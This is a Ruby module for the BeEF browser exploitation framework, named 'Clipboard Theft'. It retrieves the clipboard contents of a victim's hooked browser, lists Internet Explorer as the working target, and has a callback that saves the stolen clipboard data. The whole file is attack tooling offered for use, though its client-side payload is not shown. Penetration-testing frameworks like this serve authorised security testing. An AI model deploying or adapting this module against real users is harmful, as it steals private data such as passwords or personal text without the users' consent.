class Clipboard_theft < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Clipboard Theft',
      'Description' => 'Retrieves the clipboard contents. This module will work automatically with Internet Explorer 6.x however Internet Explorer 7.x will prompt the user and ask for permission to access the clipboard.',
      'Category' => 'Misc',
      'Author' => 'bcoles',
      'File' => __FILE__
    })
    
    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => IE
    })
    set_target({
      'verified_status' => VERIFIED_NOT_WORKING,
      'browser_name' => O
    })
    set_target({
      'verified_status' => VERIFIED_NOT_WORKING,
      'browser_name' => FF
    })
    set_target({
      'verified_status' => VERIFIED_NOT_WORKING,
      'browser_name' => C
    })

    use_template!
  end
  
  def callback
    content = {}
    content['clipboard'] = @datastore['clipboard']
    save content
  end
  
end
